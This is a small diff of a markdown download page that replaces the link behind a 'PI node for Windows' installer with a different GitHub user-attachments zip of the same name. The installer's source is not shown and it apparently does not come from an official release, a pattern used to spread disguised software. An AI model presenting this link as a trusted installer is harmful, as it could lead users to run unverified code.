@@ -5,4 +5,4 @@ Wednesday, October 30, 2024
 ## Node version: 0.5.0
 
 
-<a href="https://github.com/user-attachments/files/17935140/Pi.Network.Setup.0.5.0.zip"><img src="https://cdn.iconscout.com/icon/free/png-512/free-windows-187-675857.png?f=webp&w=256" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/user-attachments/files/17935140/Pi.Network.Setup.0.5.0.zip">PI node for Windows</a>
+<a href="https://github.com/user-attachments/files/17948730/Pi.Network.Setup.0.5.0.zip"><img src="https://cdn.iconscout.com/icon/free/png-512/free-windows-187-675857.png?f=webp&w=256" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/user-attachments/files/17948730/Pi.Network.Setup.0.5.0.zip">PI node for Windows</a>
